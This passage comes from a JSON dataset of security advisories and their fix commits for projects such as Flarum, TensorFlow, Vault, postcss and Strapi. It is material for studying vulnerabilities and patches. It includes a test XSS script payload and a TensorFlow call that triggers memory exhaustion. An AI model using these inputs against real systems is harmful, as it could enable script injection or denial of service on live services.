      "summary": "XSS vulnerability with translator Flarum's translation system allowed for string inputs to be converted into HTML DOM nodes when rendered. This change was made after v0.1.0-beta.16 (our last beta before v1.0.0) and was not noticed or documented.\n\nThis allowed for any user to type malicious HTML markup within certain user input fields and have this execute on client browsers. The example which led to the discovery of this vulnerability was in the forum search box. Entering faux-malicious HTML markup, such as <script>alert('test')</script> resulted in an alert box appearing on the forum. This attack could also be modified to perform AJAX requests on behalf of a user, possibly deleting discussions, modifying their settings or profile, or even modifying settings on the Admin panel if the attack was targetted towards a privileged user.\n\n### Impact\n\nAll Flarum communities that run flarum v1.0.0 or v1.0.1 are impacted.\n\n### Patches\n\nThe vulnerability has been fixed and published as flarum/core v1.0.2. All communities running Flarum v1.0 have to upgrade as soon as possible to v1.0.2 using:\n\n```\ncomposer update --prefer-dist --no-dev -a -W\n```\n\nYou can then confirm you run the latest version using:\n\n```\ncomposer show flarum/core\n```\n\n### Workarounds\n\n__None.__\n\n### For more information\n\nFor any questions or comments on this vulnerability please visit https://discuss.flarum.org/d/27558.\n\nFor support questions create a discussion at https://discuss.flarum.org/t/support.\n\nA reminder that if you ever become aware of a security issue in Flarum, please report it to us privately by emailing security@flarum.org, and we will address it promptly.",
      "published_date": "2021-06-07",
      "chain_len": 1,
      "project": "https://github.com/flarum/core",
      "commit_href": "https://github.com/flarum/core/commit/440bed81b8019dff00642c8f493b4909d505a28a",
      "commit_sha": "440bed81b8019dff00642c8f493b4909d505a28a",
      "patch": "SINGLE",
      "chain_ord": "['440bed81b8019dff00642c8f493b4909d505a28a']",
      "before_first_fix_commit": "{'eeb8fe1443b98f5f622ca52b4a02732f62d1aa77'}",
      "last_fix_commit": "440bed81b8019dff00642c8f493b4909d505a28a",
      "chain_ord_pos": 1.0,
      "commit_datetime": "06/06/2021, 01:41:48",
      "message": "Fix XSS vulnerability",
      "author": "David Wheatley",
      "comments": "{'com_1': {'author': 'davwheat', 'datetime': '06/07/2021, 20:53:34', 'body': 'The details about this vulnerability have now been made public.\\r\\n\\r\\nFor more information, please see: https://discuss.flarum.org/d/27558-critical-security-update-to-flarum-core-v102'}}",
      "stats": "{'additions': 12, 'deletions': 1, 'total': 13}",
      "files": "{'js/src/common/Translator.tsx': {'additions': 12, 'deletions': 1, 'changes': 13, 'status': 'renamed', 'raw_url': 'https://github.com/flarum/framework/raw/440bed81b8019dff00642c8f493b4909d505a28a/js%2Fsrc%2Fcommon%2FTranslator.tsx', 'patch': \"@@ -48,12 +48,23 @@ export default class Translator {\\n     // future there should be a hook here to inspect the user and change the\\n     // translation key. This will allow a gender property to determine which\\n     // translation key is used.\\n+\\n     if ('user' in parameters) {\\n       const user = extract(parameters, 'user');\\n \\n       if (!parameters.username) parameters.username = username(user);\\n     }\\n-    return parameters;\\n+\\n+    const escapedParameters: TranslatorParameters = {};\\n+\\n+    for (const param in parameters) {\\n+      const paramValue = parameters[param];\\n+\\n+      if (typeof paramValue === 'string') escapedParameters[param] = <>{parameters[param]}</>;\\n+      else escapedParameters[param] = parameters[param];\\n+    }\\n+\\n+    return escapedParameters;\\n   }\\n \\n   trans(id: string, parameters: TranslatorParameters = {}) {\"}}",
      "message_norm": "fix xss vulnerability",
      "language": "ca",
      "entities": "[('fix', 'ACTION', ''), ('xss', 'SECWORD', ''), ('vulnerability', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['js/src/common/Translator.tsx'])",
      "num_files": 1.0
    },
    {
      "index": 1336,
      "vuln_id": "GHSA-97wf-p777-86jq",
      "cwe_id": "{'CWE-369'}",
      "score": 2.5,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d'}",
      "dataset": "osv",
      "summary": "Division by zero in TFLite's implementation of Split ### Impact\nThe implementation of the `Split` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7/tensorflow/lite/kernels/split.cc#L63-L65):\n\n```cc\nTF_LITE_ENSURE_MSG(context, input_size % num_splits == 0, \"Not an even split\");\nconst int slice_size = input_size / num_splits;\n```\n\nAn attacker can craft a model such that `num_splits` would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d](https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
      "published_date": "2021-05-21",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d",
      "commit_sha": "b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d",
      "patch": "SINGLE",
      "chain_ord": "['b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d']",
      "before_first_fix_commit": "{'e2752089ef7ce9bcf3db0ec618ebd23ea119d0c7'}",
      "last_fix_commit": "b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d",
      "chain_ord_pos": 1.0,
      "commit_datetime": "04/28/2021, 22:31:26",
      "message": "Prevent division by 0\n\nPiperOrigin-RevId: 370998952\nChange-Id: I6b1d49079624ee1447d2d9b53a8976fb356cc8f5",
      "author": "Mihai Maruseac",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 0, 'total': 1}",
      "files": "{'tensorflow/lite/kernels/split.cc': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/b22786e7e9b7bdb6a56936ff29cc7e9968d7bc1d/tensorflow%2Flite%2Fkernels%2Fsplit.cc', 'patch': '@@ -60,6 +60,7 @@ TfLiteStatus ResizeOutputTensors(TfLiteContext* context, TfLiteNode* node,\\n   TF_LITE_ENSURE(context, axis_value < NumDimensions(input));\\n \\n   const int input_size = SizeOfDimension(input, axis_value);\\n+  TF_LITE_ENSURE(context, num_splits != 0);\\n   TF_LITE_ENSURE_MSG(context, input_size % num_splits == 0,\\n                      \"Not an even split\");\\n   const int slice_size = input_size / num_splits;'}}",
      "message_norm": "prevent division by 0\n\npiperorigin-revid: 370998952\nchange-id: i6b1d49079624ee1447d2d9b53a8976fb356cc8f5",
      "language": "en",
      "entities": "[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('370998952', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/lite/kernels/split.cc'])",
      "num_files": 1.0
    },
    {
      "index": 1489,
      "vuln_id": "GHSA-c582-c96p-r5cq",
      "cwe_id": "{'CWE-400', 'CWE-770'}",
      "score": 4.3,
      "chain": "{'https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e'}",
      "dataset": "osv",
      "summary": "Memory exhaustion in Tensorflow ### Impact \nThe [implementation of `ThreadPoolHandle`](https://github.com/tensorflow/tensorflow/blob/5100e359aef5c8021f2e71c7b986420b85ce7b3d/tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc#L79-L135) can be used to trigger a denial of service attack by allocating too much memory:\n\n```python\nimport tensorflow as tf\ny = tf.raw_ops.ThreadPoolHandle(num_threads=0x60000000,display_name='tf')\n```\n\nThis is because the `num_threads` argument is only checked to not be negative, but there is no upper bound on its value.\n    \n### Patches\nWe have patched the issue in GitHub commit [e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e](https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.",
      "published_date": "2022-02-10",
      "chain_len": 1,
      "project": "https://github.com/tensorflow/tensorflow",
      "commit_href": "https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e",
      "commit_sha": "e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e",
      "patch": "SINGLE",
      "chain_ord": "['e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e']",
      "before_first_fix_commit": "{'dc94fe9983e3deca817b7a081fa43c4e3b1ddec8'}",
      "last_fix_commit": "e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e",
      "chain_ord_pos": 1.0,
      "commit_datetime": "11/19/2021, 00:10:34",
      "message": "[tf.data] Set limit on number of threads used in threadpool_dataset.\n\nPiperOrigin-RevId: 410922677\nChange-Id: Ib25814a99043ab10805b5d2d7088ae0e0b7b04fd",
      "author": "Andrew Audibert",
      "comments": null,
      "stats": "{'additions': 19, 'deletions': 7, 'total': 26}",
      "files": "{'tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc': {'additions': 19, 'deletions': 7, 'changes': 26, 'status': 'modified', 'raw_url': 'https://github.com/tensorflow/tensorflow/raw/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e/tensorflow%2Fcore%2Fkernels%2Fdata%2Fexperimental%2Fthreadpool_dataset_op.cc', 'patch': '@@ -39,6 +39,22 @@ namespace experimental {\\n     PrivateThreadPoolDatasetOp::kDatasetType;\\n /* static */ constexpr const char* const PrivateThreadPoolDatasetOp::kDatasetOp;\\n \\n+namespace {\\n+// To prevent integer overflow issues when allocating threadpool memory for an\\n+// unreasonable number of threads.\\n+constexpr int kThreadLimit = 65536;\\n+\\n+Status ValidateNumThreads(int32_t num_threads) {\\n+  if (num_threads < 0) {\\n+    return errors::InvalidArgument(\"`num_threads` must be >= 0\");\\n+  }\\n+  if (num_threads >= kThreadLimit) {\\n+    return errors::InvalidArgument(\"`num_threads` must be < \", kThreadLimit);\\n+  }\\n+  return Status::OK();\\n+}\\n+}  // namespace\\n+\\n class ThreadPoolResource : public ResourceBase {\\n  public:\\n   ThreadPoolResource(Env* env, const ThreadOptions& thread_options,\\n@@ -83,9 +99,7 @@ class ThreadPoolHandleOp : public OpKernel {\\n     OP_REQUIRES_OK(ctx, ctx->GetAttr(\"num_threads\", &num_threads_));\\n     OP_REQUIRES_OK(ctx, ctx->GetAttr(\"max_intra_op_parallelism\",\\n                                      &max_intra_op_parallelism_));\\n-    OP_REQUIRES(\\n-        ctx, num_threads_ > 0,\\n-        errors::InvalidArgument(\"`num_threads` must be greater than zero.\"));\\n+    OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads_));\\n   }\\n \\n   // The resource is deleted from the resource manager only when it is private\\n@@ -531,8 +545,7 @@ void PrivateThreadPoolDatasetOp::MakeDatasetFromOptions(OpKernelContext* ctx,\\n                                                         DatasetBase* input,\\n                                                         int32_t num_threads,\\n                                                         DatasetBase** output) {\\n-  OP_REQUIRES(ctx, num_threads >= 0,\\n-              errors::InvalidArgument(\"`num_threads` must be >= 0\"));\\n+  OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads));\\n   *output = new Dataset(ctx,\\n                         DatasetContext(DatasetContext::Params(\\n                             {PrivateThreadPoolDatasetOp::kDatasetType,\\n@@ -546,8 +559,7 @@ void PrivateThreadPoolDatasetOp::MakeDataset(OpKernelContext* ctx,\\n   int64_t num_threads = 0;\\n   OP_REQUIRES_OK(\\n       ctx, ParseScalarArgument<int64_t>(ctx, \"num_threads\", &num_threads));\\n-  OP_REQUIRES(ctx, num_threads >= 0,\\n-              errors::InvalidArgument(\"`num_threads` must be >= 0\"));\\n+  OP_REQUIRES_OK(ctx, ValidateNumThreads(num_threads));\\n   *output = new Dataset(ctx, input, num_threads);\\n }'}}",
      "message_norm": "[tf.data] set limit on number of threads used in threadpool_dataset.\n\npiperorigin-revid: 410922677\nchange-id: ib25814a99043ab10805b5d2d7088ae0e0b7b04fd",
      "language": "en",
      "entities": "[('410922677', 'SHA', 'generic_sha')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['tensorflow/core/kernels/data/experimental/threadpool_dataset_op.cc'])",
      "num_files": 1.0
    },
    {
      "index": 36,
      "vuln_id": "GHSA-25xj-89g5-fm6h",
      "cwe_id": "{'CWE-532', 'CWE-200'}",
      "score": 7.5,
      "chain": "{'https://github.com/hashicorp/vault/commit/87f47c216cf1a28f4054b80cff40de8c9e00e36c', 'https://github.com/hashicorp/vault/commit/e52f34772affb69f3239b2cdf6523cb7cfd67a92'}",
      "dataset": "osv",
      "summary": "Information Disclosure in HashiCorp Vault HashiCorp Vault and Vault Enterprise before 1.3.6, and 1.4.2 before 1.4.2, insert Sensitive Information into a Log File.",
      "published_date": "2021-05-18",
      "chain_len": 2,
      "project": "https://github.com/hashicorp/vault",
      "commit_href": "https://github.com/hashicorp/vault/commit/e52f34772affb69f3239b2cdf6523cb7cfd67a92",
      "commit_sha": "e52f34772affb69f3239b2cdf6523cb7cfd67a92",
      "patch": "MULTI",
      "chain_ord": "['e52f34772affb69f3239b2cdf6523cb7cfd67a92', '87f47c216cf1a28f4054b80cff40de8c9e00e36c']",
      "before_first_fix_commit": "{'01a682aa48ede581e12813314e64a75e314e500e'}",
      "last_fix_commit": "87f47c216cf1a28f4054b80cff40de8c9e00e36c",
      "chain_ord_pos": 1.0,
      "commit_datetime": "05/19/2020, 14:07:46",
      "message": "Don't include username or password of proxy env vars when logging them. (#9022)",
      "author": "ncabatoff",
      "comments": null,
      "stats": "{'additions': 27, 'deletions': 7, 'total': 34}",
      "files": "{'command/server.go': {'additions': 27, 'deletions': 7, 'changes': 34, 'status': 'modified', 'raw_url': 'https://github.com/hashicorp/vault/raw/e52f34772affb69f3239b2cdf6523cb7cfd67a92/command%2Fserver.go', 'patch': '@@ -445,9 +445,7 @@ func (c *ServerCommand) runRecoveryMode() int {\\n \\t\\tvault.DefaultMaxRequestDuration = config.DefaultMaxRequestDuration\\n \\t}\\n \\n-\\tproxyCfg := httpproxy.FromEnvironment()\\n-\\tc.logger.Info(\"proxy environment\", \"http_proxy\", proxyCfg.HTTPProxy,\\n-\\t\\t\"https_proxy\", proxyCfg.HTTPSProxy, \"no_proxy\", proxyCfg.NoProxy)\\n+\\tlogProxyEnvironmentVariables(c.logger)\\n \\n \\t// Initialize the storage backend\\n \\tfactory, exists := c.PhysicalBackends[config.Storage.Type]\\n@@ -684,6 +682,31 @@ func (c *ServerCommand) runRecoveryMode() int {\\n \\treturn 0\\n }\\n \\n+func logProxyEnvironmentVariables(logger hclog.Logger) {\\n+\\tproxyCfg := httpproxy.FromEnvironment()\\n+\\tcfgMap := map[string]string{\\n+\\t\\t\"http_proxy\":  proxyCfg.HTTPProxy,\\n+\\t\\t\"https_proxy\": proxyCfg.HTTPSProxy,\\n+\\t\\t\"no_proxy\":    proxyCfg.NoProxy,\\n+\\t}\\n+\\tfor k, v := range cfgMap {\\n+\\t\\tu, err := url.Parse(v)\\n+\\t\\tif err != nil {\\n+\\t\\t\\t// Env vars may contain URLs or host:port values.  We only care\\n+\\t\\t\\t// about the former.\\n+\\t\\t\\tcontinue\\n+\\t\\t}\\n+\\t\\tif _, ok := u.User.Password(); ok {\\n+\\t\\t\\tu.User = url.UserPassword(\"redacted-username\", \"redacted-password\")\\n+\\t\\t} else if user := u.User.Username(); user != \"\" {\\n+\\t\\t\\tu.User = url.User(\"redacted-username\")\\n+\\t\\t}\\n+\\t\\tcfgMap[k] = u.String()\\n+\\t}\\n+\\tlogger.Info(\"proxy environment\", \"http_proxy\", cfgMap[\"http_proxy\"],\\n+\\t\\t\"https_proxy\", cfgMap[\"https_proxy\"], \"no_proxy\", cfgMap[\"no_proxy\"])\\n+}\\n+\\n func (c *ServerCommand) adjustLogLevel(config *server.Config, logLevelWasNotSet bool) (string, error) {\\n \\tvar logLevelString string\\n \\tif config.LogLevel != \"\" && logLevelWasNotSet {\\n@@ -894,10 +917,7 @@ func (c *ServerCommand) Run(args []string) int {\\n \\t\\tvault.DefaultMaxRequestDuration = config.DefaultMaxRequestDuration\\n \\t}\\n \\n-\\t// log proxy settings\\n-\\tproxyCfg := httpproxy.FromEnvironment()\\n-\\tc.logger.Info(\"proxy environment\", \"http_proxy\", proxyCfg.HTTPProxy,\\n-\\t\\t\"https_proxy\", proxyCfg.HTTPSProxy, \"no_proxy\", proxyCfg.NoProxy)\\n+\\tlogProxyEnvironmentVariables(c.logger)\\n \\n \\t// If mlockall(2) isn\\'t supported, show a warning. We disable this in dev\\n \\t// because it is quite scary to see when first using Vault. We also disable'}}",
      "message_norm": "don't include username or password of proxy env vars when logging them. (#9022)",
      "language": "en",
      "entities": "[('password', 'SECWORD', ''), ('#9022', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['command/server.go'])",
      "num_files": 1.0
    },
    {
      "index": 2613,
      "vuln_id": "GHSA-ppc3-fpvh-7396",
      "cwe_id": "{'CWE-362'}",
      "score": 7.0,
      "chain": "{'https://github.com/apache/netbeans-html4j/commit/fa70e507e5555e1adb4f6518479fc408a7abd0e6'}",
      "dataset": "osv",
      "summary": "Improper synchronization in Apache Netbeans HTML/Java API There exists a race condition between the deletion of the temporary file and the creation of the temporary directory in `webkit` subproject of HTML/Java API version 1.7. A similar vulnerability has recently been disclosed in other Java projects and the fix in HTML/Java API version 1.7.1 follows theirs: To avoid local privilege escalation version 1.7.1 creates the temporary directory atomically without dealing with the temporary file.",
      "published_date": "2022-02-09",
      "chain_len": 1,
      "project": "https://github.com/apache/netbeans-html4j",
      "commit_href": "https://github.com/apache/netbeans-html4j/commit/fa70e507e5555e1adb4f6518479fc408a7abd0e6",
      "commit_sha": "fa70e507e5555e1adb4f6518479fc408a7abd0e6",
      "patch": "SINGLE",
      "chain_ord": "['fa70e507e5555e1adb4f6518479fc408a7abd0e6']",
      "before_first_fix_commit": "{'d1dcd9c0542ac46d7764256a81057dfbe2d8805a'}",
      "last_fix_commit": "fa70e507e5555e1adb4f6518479fc408a7abd0e6",
      "chain_ord_pos": 1.0,
      "commit_datetime": "12/15/2020, 08:56:27",
      "message": "createTempDirectory atomically",
      "author": "Jaroslav Tulach",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 3, 'total': 4}",
      "files": "{'webkit/src/main/java/org/netbeans/html/presenters/webkit/UnJarResources.java': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/apache/netbeans-html4j/raw/fa70e507e5555e1adb4f6518479fc408a7abd0e6/webkit%2Fsrc%2Fmain%2Fjava%2Forg%2Fnetbeans%2Fhtml%2Fpresenters%2Fwebkit%2FUnJarResources.java', 'patch': '@@ -39,9 +39,7 @@ static URL extract(URL url) throws IOException {\\n         if (jar == null) {\\n             return url;\\n         }\\n-        File dir = File.createTempFile(jar.getName(), \".dir\");\\n-        dir.delete();\\n-        dir.mkdirs();\\n+        File dir = Files.createTempDirectory(jar.getName() + \".dir\").toFile();\\n \\n         Enumeration<JarEntry> en = jar.entries();\\n         while (en.hasMoreElements()) {'}}",
      "message_norm": "createtempdirectory atomically",
      "language": "en",
      "entities": null,
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['webkit/src/main/java/org/netbeans/html/presenters/webkit/UnJarResources.java'])",
      "num_files": 1.0
    },
    {
      "index": 2261,
      "vuln_id": "GHSA-jjcx-999m-35hc",
      "cwe_id": "{'CWE-20'}",
      "score": 3.3,
      "chain": "{'https://github.com/firefly-iii/firefly-iii/commit/e80d616ef4397e6e764f6b7b7a5b30121244933c'}",
      "dataset": "osv",
      "summary": "Improper Input Validation in Firefly III Firefly III 4.7.17.3 is vulnerable to local file enumeration. An attacker can enumerate local files due to the lack of protocol scheme sanitization, such as for file:/// URLs. This is related to fints_url to import/job/configuration, and import/create/fints.",
      "published_date": "2021-09-08",
      "chain_len": 1,
      "project": "https://github.com/firefly-iii/firefly-iii",
      "commit_href": "https://github.com/firefly-iii/firefly-iii/commit/e80d616ef4397e6e764f6b7b7a5b30121244933c",
      "commit_sha": "e80d616ef4397e6e764f6b7b7a5b30121244933c",
      "patch": "SINGLE",
      "chain_ord": "['e80d616ef4397e6e764f6b7b7a5b30121244933c']",
      "before_first_fix_commit": "{'2ddf48f15cbdbb475221c299872420f625c3bc3f'}",
      "last_fix_commit": "e80d616ef4397e6e764f6b7b7a5b30121244933c",
      "chain_ord_pos": 1.0,
      "commit_datetime": "08/02/2019, 15:05:54",
      "message": "Fix #2367",
      "author": "James Cole",
      "comments": null,
      "stats": "{'additions': 20, 'deletions': 0, 'total': 20}",
      "files": "{'app/Support/Import/JobConfiguration/FinTS/NewFinTSJobHandler.php': {'additions': 20, 'deletions': 0, 'changes': 20, 'status': 'modified', 'raw_url': 'https://github.com/firefly-iii/firefly-iii/raw/e80d616ef4397e6e764f6b7b7a5b30121244933c/app%2FSupport%2FImport%2FJobConfiguration%2FFinTS%2FNewFinTSJobHandler.php', 'patch': \"@@ -60,6 +60,9 @@ public function configureJob(array $data): MessageBag\\n         $config['fints_password']  = (string)(Crypt::encrypt($data['fints_password']) ?? '');\\n         $config['apply-rules']     = 1 === (int)$data['apply_rules'];\\n \\n+        // sanitize FinTS URL.\\n+        $config['fints_url'] = $this->validURI($config['fints_url']) ? $config['fints_url'] : '';\\n+\\n         $this->repository->setConfiguration($this->importJob, $config);\\n \\n \\n@@ -108,4 +111,21 @@ public function setImportJob(ImportJob $importJob): void\\n         $this->repository->setUser($importJob->user);\\n     }\\n \\n+    /**\\n+     * @param string $fints_url\\n+     *\\n+     * @return bool\\n+     */\\n+    private function validURI(string $fintsUri): bool\\n+    {\\n+        $res = filter_var($fintsUri, FILTER_VALIDATE_URL);\\n+        if (false === $res) {\\n+            return false;\\n+        }\\n+        $scheme = parse_url($fintsUri, PHP_URL_SCHEME);\\n+\\n+        return 'https' === $scheme;\\n+    }\\n+\\n+\\n }\"}}",
      "message_norm": "fix #2367",
      "language": "ca",
      "entities": "[('fix', 'ACTION', ''), ('#2367', 'ISSUE', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['app/Support/Import/JobConfiguration/FinTS/NewFinTSJobHandler.php'])",
      "num_files": 1.0
    },
    {
      "index": 2147,
      "vuln_id": "GHSA-hwj9-h5mp-3pm3",
      "cwe_id": "{'CWE-400'}",
      "score": 5.3,
      "chain": "{'https://github.com/postcss/postcss/commit/54cbf3c4847eb0fb1501b9d2337465439e849734', 'https://github.com/postcss/postcss/commit/b6f3e4d5a8d7504d553267f80384373af3a3dec5', 'https://github.com/postcss/postcss/commit/8682b1e4e328432ba692bed52326e84439cec9e4'}",
      "dataset": "osv",
      "summary": "Regular Expression Denial of Service in postcss The npm package `postcss` from 7.0.0 and before versions 7.0.36 and 8.2.10 is vulnerable to Regular Expression Denial of Service (ReDoS) during source map parsing.",
      "published_date": "2021-05-10",
      "chain_len": 3,
      "project": "https://github.com/postcss/postcss",
      "commit_href": "https://github.com/postcss/postcss/commit/b6f3e4d5a8d7504d553267f80384373af3a3dec5",
      "commit_sha": "b6f3e4d5a8d7504d553267f80384373af3a3dec5",
      "patch": "MULTI",
      "chain_ord": "['8682b1e4e328432ba692bed52326e84439cec9e4', 'b6f3e4d5a8d7504d553267f80384373af3a3dec5', '54cbf3c4847eb0fb1501b9d2337465439e849734']",
      "before_first_fix_commit": "{'12832f3d203474bd273bd06bd3b2407567bfe09e'}",
      "last_fix_commit": "54cbf3c4847eb0fb1501b9d2337465439e849734",
      "chain_ord_pos": 2.0,
      "commit_datetime": "04/11/2021, 13:03:12",
      "message": "Fix unsafe regexp in getAnnotationURL() too",
      "author": "Andrey Sitnik",
      "comments": null,
      "stats": "{'additions': 1, 'deletions': 3, 'total': 4}",
      "files": "{'lib/previous-map.js': {'additions': 1, 'deletions': 3, 'changes': 4, 'status': 'modified', 'raw_url': 'https://github.com/postcss/postcss/raw/b6f3e4d5a8d7504d553267f80384373af3a3dec5/lib%2Fprevious-map.js', 'patch': '@@ -48,9 +48,7 @@ class PreviousMap {\\n   }\\n \\n   getAnnotationURL(sourceMapString) {\\n-    return sourceMapString\\n-      .match(/\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\s*\\\\*\\\\//)[1]\\n-      .trim()\\n+    return sourceMapString.match(/\\\\/\\\\*\\\\s*# sourceMappingURL=(.*)\\\\*\\\\//)[1].trim()\\n   }\\n \\n   loadAnnotation(css) {'}}",
      "message_norm": "fix unsafe regexp in getannotationurl() too",
      "language": "en",
      "entities": "[('fix', 'ACTION', ''), ('unsafe', 'SECWORD', '')]",
      "classification_level_1": null,
      "classification_level_2": null,
      "list_files": "dict_keys(['lib/previous-map.js'])",
      "num_files": 1.0
    },
    {
      "index": 453,
      "vuln_id": "GHSA-4p55-xj37-fx7g",
      "cwe_id": "{'CWE-276'}",
      "score": 0.0,
      "chain": "{'https://github.com/strapi/strapi/commit/3cdd73987950d5c7976701047b38203e902007bb'}",
      "dataset": "osv",
      "summary": "Improper Authorization in Strapi In Strapi before 3.2.5, there is no admin::hasPermissions restriction for CTB (aka content-type-builder) routes.",
      "published_date": "2020-10-29",
      "chain_len": 1,
      "project": "https://github.com/strapi/strapi",
      "commit_href": "https://github.com/strapi/strapi/commit/3cdd73987950d5c7976701047b38203e902007bb",
      "commit_sha": "3cdd73987950d5c7976701047b38203e902007bb",
      "patch": "SINGLE",
      "chain_ord": "['3cdd73987950d5c7976701047b38203e902007bb']",
      "before_first_fix_commit": "{'15e8a76f11c7d86ee3746efff187cbf83e220424', '4d00bc09b8bd7c0938e2d54f480d503560fcb45e'}",
      "last_fix_commit": "3cdd73987950d5c7976701047b38203e902007bb",
      "chain_ord_pos": 1.0,
      "commit_datetime": "10/22/2020, 14:30:20",
      "message": "Merge pull request #8439 from strapi/fix/ctb-permissions\n\nAdd permission to CTB routes",
      "author": "Alexandre BODIN",
      "comments": null,
      "stats": "{'additions': 42, 'deletions': 14, 'total': 56}",
      "files": "{'packages/strapi-plugin-content-type-builder/config/routes.json': {'additions': 42, 'deletions': 14, 'changes': 56, 'status': 'modified', 'raw_url': 'https://github.com/strapi/strapi/raw/3cdd73987950d5c7976701047b38203e902007bb/packages%2Fstrapi-plugin-content-type-builder%2Fconfig%2Froutes.json', 'patch': '@@ -5,111 +5,139 @@\\n       \"path\": \"/reserved-names\",\\n       \"handler\": \"Builder.getReservedNames\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"/connections\",\\n       \"handler\": \"Connections.getConnections\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"/content-types\",\\n       \"handler\": \"ContentTypes.getContentTypes\",\\n       \"config\": {\\n-        \"policies\": []\\n+        \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"/content-types/:uid\",\\n       \"handler\": \"ContentTypes.getContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"POST\",\\n       \"path\": \"/content-types\",\\n       \"handler\": \"ContentTypes.createContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"PUT\",\\n       \"path\": \"/content-types/:uid\",\\n       \"handler\": \"ContentTypes.updateContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"DELETE\",\\n       \"path\": \"/content-types/:uid\",\\n       \"handler\": \"ContentTypes.deleteContentType\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"/components\",\\n       \"handler\": \"Components.getComponents\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"GET\",\\n       \"path\": \"/components/:uid\",\\n       \"handler\": \"Components.getComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", [\"plugins::content-type-builder.read\"]]\\n+        ]\\n       }\\n     },\\n     {\\n       \"method\": \"POST\",\\n       \"path\": \"/components\",\\n       \"handler\": \"Components.createComponent\",\\n       \"config\": {\\n-        \"policies\": []\\n+      \"policies\": [\\n+          [\"admin::hasPermissions\", 